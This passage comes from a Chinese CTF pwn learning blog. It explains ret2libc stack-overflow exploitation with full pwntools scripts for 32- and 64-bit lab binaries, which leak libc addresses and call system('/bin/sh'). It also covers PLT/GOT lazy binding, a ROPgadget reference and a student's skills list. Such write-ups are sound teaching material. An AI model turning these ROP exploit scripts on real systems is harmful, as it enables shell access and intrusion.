alt="image-20250219212110586"></p><p>先用字符填充缓冲区，也包括old_ebp的地址,再把main函数的返回地址覆盖位puts函数的地址，也就是puts的PLT表</p><p>紧接着上图中addr(_start)所在的位置（靠下的图片中浅蓝色的四个格子）相当于puts函数的返回地址，我们要求puts函数执行完成后再次返回main函数的起始位置，故这个位置应当填写main函数起始位置的地址，再往后的四个字节应当填写puts函数的参数，z&#96;即任意一个已经执行过的函数，这里依旧可以填puts的got，因此我们构造的payload1如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">payload1 = b&quot;a&quot; * offset + puts_plt + addr_start + puts_got<br></code></pre></td></tr></table></figure><p>文章用lld指令找到了本地的libc</p><p>随后看看本地研究这个题目的部分解题思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>e = ELF(&quot;./ret2libc3_32&quot;)<br>libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) #确定libc库并解析<br><br>p = process(&quot;./ret2libc3_32&quot;)<br><br>puts_plt = e.plt[&#x27;puts&#x27;] #puts函数的入口地址<br>puts_got = e.got[&#x27;puts&#x27;]  #puts函数的got表地址<br>start_addr = e.symbols[&#x27;_start&#x27;] #程序的起始地址<br><br>payload1 = b&#x27;a&#x27; * 112 + p32(puts_plt) + p32(start_addr) + p32(puts_got)<br><br>#attach(p, &quot;b *0x0804868F&quot;) #这两行注释用于调试程序，读者可以用gdb看看程序的执行过程，断点设置在了gets之前<br>#pause()<br><br>p.sendlineafter(&quot;Can you find it !?&quot;, payload1)<br><br>puts_real_addr = u32(p.recv()[0:4])  #接收puts的真实地址，占4个字节<br><br>print(&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;.format(hex(puts_plt),hex(puts_got), hex(start_addr)))<br>print(&quot;puts_real_addr: &quot;, hex(puts_real_addr))<br></code></pre></td></tr></table></figure><p>上述部分用于寻找puts的真实地址:</p><p><img src="/../00000000/image-20250219214356318.png" alt="image-20250219214356318"></p><p>在本地运行两次后会发现他们得到的puts的真实地址不同，但是后三位都是2a0,可以据此找到libc的版本,进而计算libc的基址</p><p><strong>基地址 &#x3D; 真实地址 - 偏移地址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python3">libc_addr = puts_real_addr - libc.sym[&#x27;puts&#x27;]<br>print(hex(libc_addr))<br></code></pre></td></tr></table></figure><p>有了基地址libc_addr，我们就可以寻找system函数和”&#x2F;bin&#x2F;sh”字符串的真实地址了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python3">system_addr = libc_addr + libc.sym[&quot;system&quot;]<br>binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))<br></code></pre></td></tr></table></figure><p>有了这两个关键地址就可以开始构造payload2了</p><p><img src="/../00000000/image-20250219214904586.png" alt="image-20250219214904586"></p><p>payload2的原理就是让main函数的返回地址是system函数的真实地址，其后接任意一个4字节长度的数据，占位，表示system函数的返回地址（是啥不重要，因为执行了system(“&#x2F;bin&#x2F;sh”)之后就拿到shell了，我管他返回到哪里），再后面跟着system函数的参数，也就是”&#x2F;bin&#x2F;sh”字符串的真实地址即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python3">payload2 = b&#x27;a&#x27; * 112 + p32(system_addr) + b&quot;aaaa&quot; + p32(binsh_addr)<br>#pause()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>e = ELF(&quot;./ret2libc3&quot;)<br>libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) #确定libc库并解析<br>p = process(&quot;./ret2libc3&quot;)<br>puts_plt = e.plt[&#x27;puts&#x27;] #puts函数的入口地址<br>puts_got = e.got[&#x27;puts&#x27;]  #puts函数的got表地址<br>start_addr = e.symbols[&#x27;_start&#x27;] #程序的起始地址<br>payload1 = b&#x27;a&#x27; * 112 + p32(puts_plt) + p32(start_addr) + p32(puts_got)<br>#attach(p, &quot;b *0x0804868F&quot;)<br>#pause()<br>p.sendlineafter(&quot;Can you find it !?&quot;, payload1)<br>puts_real_addr = u32(p.recv()[0:4])  #接收puts的真实地址，占4个字节<br>print(&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;.format(hex(puts_plt),hex(puts_got), hex(start_addr)))<br>print(&quot;puts_real_addr: &quot;, hex(puts_real_addr)) <br>libc_addr = puts_real_addr - libc.sym[&#x27;puts&#x27;] #计算libc库的基地址<br>print(hex(libc_addr))<br>system_addr = libc_addr + libc.sym[&quot;system&quot;] #计算system函数的真实地址<br>binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))  #计算binsh字符串的真实地址<br>payload2 = b&#x27;a&#x27; * 112 + p32(system_addr) + b&quot;aaaa&quot; + p32(binsh_addr)<br>#pause()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>64位的ret2libc</p><p>和32位区别不大，核心就是传参方式不一样了，32位采用栈传参，而64位程序函数的前六个参数分别用寄存器rdi, rsi, rdx, rcx, r8, r9传参，后续参数采用栈传参。另外64位程序还有个栈平衡的问题，在最后的payload中需要添加一个ret指令的地址。</p><p>ida64_main:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  __int64 buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Pls Input&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100u</span>LL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload1的构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python3">payload = b&quot;a&quot; * offset #垃圾数据的填充<br>payload += p64(pop_rdi_ret_addr) #用寄存器rdi传参，参数是read_got<br>payload += p64(read_got) #想要存入rdi的参数<br>payload += p64(puts_plt) #puts的入口地址，即plt表的地址<br>payload += p64(main_addr) #程序的起始地址<br></code></pre></td></tr></table></figure><p><strong>这里已经调用了read，所以read有在got表里面有实际地址，而这个时候再调用puts 打印出read的实际地址，当然也可以用read的实际地址</strong></p><p>接下来我们只要查找这几个地址即可：pop_rdi_ret_addr, read_got, puts_plt, main_addr。首先是pop_rdi_ret_addr，这个就是个ROP嘛，我们用ROPgadget寻找即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary ret2libc --only &quot;pop|ret&quot; | grep rdi<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python3">puts_plt = e.plt[&#x27;puts&#x27;] #puts函数的入口地址<br>read_got = e.got[&#x27;read&#x27;]  #puts函数的got表地址<br>start_addr = e.symbols[&#x27;_start&#x27;] #程序的起始地址<br></code></pre></td></tr></table></figure><p>可以很容易的确定起始位置是main_addr &#x3D; 0x401176，好了，第一部分的代码我们可以写出来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)<br>p = process(&quot;ret2libc&quot;)<br><br>pop_rdi_ret_addr = 0x401293<br>read_got = 0x403368<br>puts_plt = 0x401060<br>main_addr = 0x401176<br>offset = 40<br><br>payload = b&quot;a&quot; * offset<br>payload += p64(pop_rdi_ret_addr) <br>payload += p64(read_got)<br>payload += p64(puts_plt)<br>payload += p64(main_addr)<br><br>#attach(p,&quot;b *0x40121e&quot;)<br>p.recvuntil(&quot;Pls Input&quot;)<br>#pause()<br><br>p.send(payload)<br>read_real_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))  #read函数的真实地址，由于真实地址总是从7f开始，故从7f开始接收，长度补足8个字节<br>print(&quot;read_real_addr: &quot;, hex(read_real_addr))<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">high_addr</th></tr></thead><tbody><tr><td align="center">main_addr</td></tr><tr><td align="center">puts_plt</td></tr><tr><td align="center">read_got</td></tr><tr><td align="center">pop_rdi_ret_addr</td></tr><tr><td align="center">‘a’ * offset</td></tr><tr><td align="center">low_addr</td></tr></tbody></table><p>逻辑：</p><p>1.第一次ret的地址是pop_rdi_ret_addr</p><p>2.pop 的参数是 read_got 弹进rdi寄存器中</p><p>3.然后就是第二次ret，地址是puts_plt</p><p>4.puts函数的参数就是rdi中的read_got</p><p>5.运行完后弹回main函数重新开始程序</p><p>根据函数实际地址的后三位可以确定libc的版本</p><p>接下来基本上和32位的没啥区别了，计算libc的基地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">libc_base = read_real_addr - libc.sym[&quot;read&quot;]<br></code></pre></td></tr></table></figure><p>随后计算字符‘&#x2F;bin&#x2F;sh’的地址，system函数的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python3">system_addr = libc_base + libc.sym[&quot;system&quot;]<br>binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))<br></code></pre></td></tr></table></figure><p>这里还有一个栈平衡的操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)<br>p = process(&quot;ret2libc&quot;)<br><br>pop_rdi_ret_addr = 0x401293<br>read_got = 0x403368<br>puts_plt = 0x401060<br>main_addr = 0x401176<br>offset = 40<br>payload = b&quot;a&quot; * offset<br>payload += p64(pop_rdi_ret_addr)<br>payload += p64(read_got)<br>payload += p64(puts_plt)<br>payload += p64(main_addr)<br><br>#attach(p,&quot;b *0x40121e&quot;)<br>p.recvuntil(&quot;Pls Input&quot;)<br>#pause()<br>p.send(payload)<br><br>read_real_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>print(&quot;read_real_addr: &quot;, hex(read_real_addr))<br><br>libc_base = read_real_addr - libc.sym[&quot;read&quot;]<br>print(&quot;libc_base: &quot;, hex(libc_base))<br><br>system_addr = libc_base + libc.sym[&quot;system&quot;]<br>binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))<br><br>print(&quot;system_addr:&#123;&#125;&quot;.format(hex(system_addr)))<br>print(&quot;binsh_addr:&#123;&#125;&quot;.format(hex(binsh_addr)))<br><br>payload = b&quot;a&quot; * offset<br>payload += p64(0x40101a) #需要添加一个ret，仅仅用于栈平衡<br>payload += p64(pop_rdi_ret_addr)<br>payload += p64(binsh_addr)<br>payload += p64(system_addr)<br><br>p.recvuntil(&quot;Pls Input&quot;)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>补充知识：</strong></p><p><strong>PLT和GOT表</strong></p><p>PLT与GOT表均为动态链接过程中的重要部分</p><p>GOT: Global Offset Table, 全局偏移表，包含所有需要动态链接的外部函数的地址（在第一次执行后）<br>PLT: Procedure Link Table, 过程链接表，包含调用外部函数的跳转指令（跳转到GOT表中），以及初始化外部调用指令（用于链接器动态绑定dl_runtime_resolve）</p><p>Linux中虚拟内存映射分段中一般在这方面一般分三个段</p><p><code>.plt</code>: 即上文提到的过程链接表，包含全部的外部函数跳转指令信息</p><p><code>.got.plt</code>: <strong>即下文将要表达的GOT表</strong>，与PLT表搭配使用，包含全部外部函数地址（第一次调用前为伪地址，具体见下）</p><p><code>.got</code> : 存放其他全局符号信息，注意与<code>.got.plt</code>不同，与下文函数动态链接过程关系不大</p><p><strong>简单来说，PLT表存放跳转相关指令，GOT表存放外部函数（符号）地址</strong></p><p><strong>PLT</strong></p><p>这个现在介绍的是.got.plt</p><p>1.结构可见下图 <code>Procedure</code></p><p>2.第一个表项<code>PLT[0]</code>为（通用调用解析表项）没有存储任何外部函数的跳转信息，保存调用dynamic linker resolve【动态链接器解析】函数<code>_dl_runtime_resolve</code>的参数（link_map）和地址</p><p>3.之后的每个表项，分为两部分（三句）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;part 1<br>jmp *fun@got<br>;part 2<br>push offset<br>jmp plt[0]<br></code></pre></td></tr></table></figure><p><img src="/../00000000/image-20250219031255632.png" alt="image-20250219031255632"></p><p><strong>GOT</strong></p><ul><li>每一项为单个地址</li><li>第一项指向dynamic段</li><li>第二项指向link_map</li><li>第三项指向_dl_runtime_resolve函数</li><li>之后每项一一对应PLT表中每个表项（序号不同）</li></ul><p><img src="/../00000000/image-20250219032633901.png" alt="image-20250219032633901"></p><p><strong>延迟绑定机制</strong></p><p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序</p><p>假如存在一个bar函数，这个函数在PLT中的条目为bar@plt，在GOT中的条目为bar@got，那么在第一次调用bar函数的时候，首先会跳转到PLT，伪代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">bar@plt:<br><br>jmp bar@got<br><br>patch bar@got<br></code></pre></td></tr></table></figure><p>这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch bar@got，这一行代码的作用是<strong>将bar函数真正的地址填充</strong>到bar@got，然后跳转到bar函数真正的地址执行代码。</p><p>函数第一次被调用的流程：</p><p><img src="/../00000000/image-20250219144355767.png" alt="image-20250219144355767"></p><p>1.每次调用外部函数，形式均为call func@plt，PC指向每个PLT表项的第一部分：</p><p>​跳转到GOT表对应项指向位置（为表项的值，非表项本身地址）</p><p>2.第一次调用前，GOT表中对应项存储的不是外部函数的真实地址，而重新指回PLT表，指向PLT表对应表项（相同函数）的第二部分，使其初始化dynamic linker进行运行时解析(_dl_runtime_resolve)</p><p>3.回到PLT表第二部分，向栈中压入表项序号</p><p><strong>第一次调用过程理解：</strong>[ 序号并不对应表中操作序号 ]</p><p>1.程序首次调用printf@plt</p><p>2.printf@plt跳转到GOT中对应的一个条目（初始指向PLT的解析逻辑）</p><p>3.解析逻辑动态调用链接器解析printf函数的真实地址</p><p>4.将解析后的地址写回GOT表</p><p>5.后续调用流程</p><p>6.直接通过GOT表跳转到已经解析的地址</p><p><img src="/../00000000/image-20250219154602549.png" alt="image-20250219154602549"></p><p><strong>第二次调用过程理解：</strong> [  ]</p><p>1.跳转到PLT表</p><p>2.跳转到GOT表 [ 已经存储了函数的实际地址 ]</p><p>3.跳转到被调用函数的实际地址调用</p><h3 id="ret2libc文章阅读"><a href="#ret2libc文章阅读" class="headerlink" title="ret2libc文章阅读"></a><strong>ret2libc</strong>文章阅读</h3><p>链接：<a href="https://blog.csdn.net/Bossfrank/article/details/134872403#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%88%E7%AE%80%E8%A6%81%E4%BA%86%E8%A7%A3%EF%BC%89">https://blog.csdn.net/Bossfrank/article/details/134872403#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%88%E7%AE%80%E8%A6%81%E4%BA%86%E8%A7%A3%EF%BC%89</a></p><h4 id="PLT表-和-GOT表-及-延迟绑定-的理解"><a href="#PLT表-和-GOT表-及-延迟绑定-的理解" class="headerlink" title="PLT表 和 GOT表 及 延迟绑定 的理解"></a>PLT表 和 GOT表 及 延迟绑定 的理解</h4><p>got表：globle offset table 全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址。我们的最终目标就是拿到system函数的got表地址，同时知道libc的基地址的话即可找到system函数的真实地址。</p><p>plt表：procedure link table 程序链接表，位于代码段，是一个每个条目是16字节内容的数组，使得代码能够方便的访问共享的函数或者变量。可以理解为函数的入口地址，通过劫持返回地址为puts函数的plt表地址，即可执行puts函数。</p><p>关系图：</p><p><img src="/../00000000/image-20250219174643129.png" alt="image-20250219174643129"></p><p>​<strong>图一</strong></p><p>可执行的二进制文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址（即最靠右的两个箭头已经建立），但是在一开始（尚未发生函数调用时）就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制。</p><p><strong>延迟绑定</strong></p><p>只有动态库libc中的函数在被调用时，才会进行地址解析和重定位工作，也就是说，只有函数发生调用之后，上图中最右侧的两个箭头才建立完成，我们才能够通过got表读取到libc中的函数。</p><p><strong>第一次调用函数</strong></p><p><img src="/../00000000/image-20250219174906448.png" alt="image-20250219174906448"></p><p>​<strong>图二</strong></p><p> 在可执行二进制程序调用函数A时，会先找到函数A对应的PLT表，PLT表中第一行指令则是找到函数A对应的GOT表。此时由于是程序第一次调用A，GOT表还未更新（就是图一中最右边俩箭头还没有建立），会先去公共PLT进行一番操作查找函数A的位置，找到A的位置后再更新A的GOT表，并调用函数A。</p><p><strong>非第一次调用函数</strong></p><p><img src="/../00000000/image-20250219175022331.png" alt="image-20250219175022331"></p><p>​<strong>图三</strong></p><p>此时A的GOT表已经更新，可以直接在GOT表中找到其在内存中的位置并直接调用。说白了，图三就是图一.</p><h2 id="ropgadget工具使用"><a href="#ropgadget工具使用" class="headerlink" title="ropgadget工具使用"></a>ropgadget工具使用</h2><h4 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h4><p>ROPgadget 是一款开源工具，专为二进制文件中的 ROP（Return-Oriented Programming）漏洞利用而设计。它能够帮助安全研究人员和漏洞利用开发者快速搜索和识别二进制文件中的 gadgets，从而简化 ROP 链的构建过程。</p><h4 id="2-支持的文件格式和架构"><a href="#2-支持的文件格式和架构" class="headerlink" title="2. 支持的文件格式和架构"></a>2. 支持的文件格式和架构</h4><ul><li><strong>文件格式</strong>：支持 ELF、PE、Mach-O 和 Raw 格式的二进制文件。</li><li><strong>架构</strong>：支持 x86、x64、ARM、ARM64、MIPS、PowerPC、SPARC、RISC-V 64 和 RISC-V Compressed 等多种架构。</li></ul><h4 id="3-功能列表"><a href="#3-功能列表" class="headerlink" title="3. 功能列表"></a>3. 功能列表</h4><p>以下是 ROPgadget 的主要功能和参数说明：</p><ol><li><strong>搜索 gadgets</strong><ul><li><strong><code>--binary &lt;binary&gt;</code></strong>：指定要分析的二进制文件。</li><li><strong><code>--opcode &lt;opcodes&gt;</code></strong>：搜索包含指定操作码的 gadgets。</li><li><strong><code>--string &lt;string&gt;</code></strong>：搜索包含指定字符串的 gadgets。</li><li><strong><code>--memstr &lt;string&gt;</code></strong>：在所有可读段中搜索指定字符串。</li><li><strong><code>--depth &lt;nbyte&gt;</code></strong>：设置搜索深度，默认为 10。</li><li><strong><code>--only &lt;key&gt;</code></strong>：仅显示包含指定关键字的 gadgets。</li><li><strong><code>--filter &lt;key&gt;</code></strong>：排除包含指定关键字的 gadgets。</li><li><strong><code>--range &lt;start-end&gt;</code></strong>：在指定地址范围内搜索 gadgets。</li><li><strong><code>--badbytes &lt;byte&gt;</code></strong>：排除包含指定字节的 gadgets。</li><li><strong><code>--re &lt;re&gt;</code></strong>：使用正则表达式搜索 gadgets。</li></ul></li><li><strong>生成 ROP 链</strong><ul><li><strong><code>--ropchain</code></strong>：基于找到的 gadgets 自动生成 ROP 链。</li><li><strong><code>--callPreceded</code></strong>：仅显示被调用指令预先调用的 gadgets。</li><li><strong><code>--multibr</code></strong>：启用多分支 gadgets。</li></ul></li><li><strong>架构和模式</strong><ul><li><strong><code>--rawArch &lt;arch&gt;</code></strong>：为 raw 文件指定架构（如 x86、arm 等）。</li><li><strong><code>--rawMode &lt;mode&gt;</code></strong>：为 raw 文件指定模式（如 32、64、arm、thumb 等）。</li><li><strong><code>--rawEndian &lt;endian&gt;</code></strong>：为 raw 文件指定字节序（little 或 big）。</li><li><strong><code>--thumb</code></strong>：在 ARM 架构下使用 Thumb 模式。</li></ul></li><li><strong>其他功能</strong><ul><li><strong><code>--console</code></strong>：将输出发送到控制台。</li><li><strong><code>--norop</code></strong>：禁用 ROP 搜索引擎。</li><li><strong><code>--nojop</code></strong>：禁用 JOP 搜索引擎。</li><li><strong><code>--nosys</code></strong>：禁用系统调用 gadgets。</li><li><strong><code>--all</code></strong>：显示所有 gadgets，无过滤。</li><li><strong><code>--noinstr</code></strong>：不显示 gadgets 指令，仅显示偏移。</li><li><strong><code>--dump</code></strong>：输出 gadgets 的原始字节。</li><li><strong><code>--silent</code></strong>：禁用分析过程中的 gadgets 打印。</li><li><strong><code>--align &lt;ALIGN&gt;</code></strong>：对齐 gadgets 地址。</li><li><strong><code>--mipsrop &lt;rtype&gt;</code></strong>：针对 MIPS 架构指定 ROP 类型。</li></ul></li></ol><h4 id="4-应用场景"><a href="#4-应用场景" class="headerlink" title="4. 应用场景"></a>4. 应用场景</h4><ul><li><strong>漏洞利用开发</strong>：快速找到所需的 gadgets，加速 ROP 链的构建。</li><li><strong>安全研究</strong>：分析二进制文件，识别潜在的漏洞和攻击面。</li><li><strong>逆向工程</strong>：帮助理解二进制文件的结构和行为。</li><li><strong>教学与培训</strong>：帮助学生和新手理解 ROP 攻击的原理和实践。</li></ul><h4 id="5-使用示例"><a href="#5-使用示例" class="headerlink" title="5. 使用示例"></a>5. 使用示例</h4><p>以下是一些常见的使用示例：</p><ol><li><p><strong>搜索所有 gadgets</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./example<br></code></pre></td></tr></table></figure></li><li><p><strong>搜索特定指令的 gadgets</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./example --only <span class="hljs-string">&quot;pop|ret&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>排除特定字节的 gadgets</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./example --badbytes <span class="hljs-string">&quot;00|0a&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>在指定地址范围内搜索 gadgets</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./example --range 0x08041000-0x08042000<br></code></pre></td></tr></table></figure></li><li><p><strong>生成 ROP 链</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./example --ropchain<br></code></pre></td></tr></table></figure></li><li><p><strong>使用正则表达式搜索 gadgets</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./example --re <span class="hljs-string">&quot;mov.*&quot;</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h4><p>ROPgadget 是一款功能强大且灵活的工具，支持多种文件格式和架构，并提供丰富的搜索和过滤选项。它能够帮助安全研究人员和漏洞利用开发者快速定位和利用 gadgets，从而简化 ROP 攻击的开发过程。</p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>blog_learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scr1w_reply_brief</title>
    <link href="/Scr1w_reply_brief/"/>
    <url>/Scr1w_reply_brief/</url>
    
    <content type="html"><![CDATA[<h1 id="Scr1w答辩-2025"><a href="#Scr1w答辩-2025" class="headerlink" title="Scr1w答辩[2025]"></a>Scr1w答辩[2025]</h1><p><strong>[ 基础知识 ]</strong></p><p>调用栈的相关约定知识，栈的基本结构，内外平栈，调用函数的相关知识，汇编语言，栈溢出原理，系统调用，浮点数的存储[IEEE 754规则] ， C++ ， 二进制文件 ， Linux操作系统的基本命令 ， python的基本语法 ， pwntools利用 ，延迟绑定机制  ， tmux终端复用器 ，</p><p><strong>[ 已经有学习并且比较熟悉基本的漏洞 ]</strong></p><p>ret2text , ret2shellcode , ret2syscall , ret2libc , 格式化字符串 ，整数溢出 ，下标溢出 ，str函数的漏洞 [strlen]及相关函数的漏洞 ， canary绕过</p><p><strong>[有了解但不熟悉并目前准备学习]</strong></p><p>栈迁移 ，非格式化字符串漏洞 ，更多的gadget ，一些题解中的方法 ， 题解模板的学习利用 ,   srop ， ret2csu  ， io的劫持 ， </p><p><strong>[ 使用工具 ]</strong></p><p>pwngdb ， ROPgadget ， IDA Pro </p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>stack_sum_up</title>
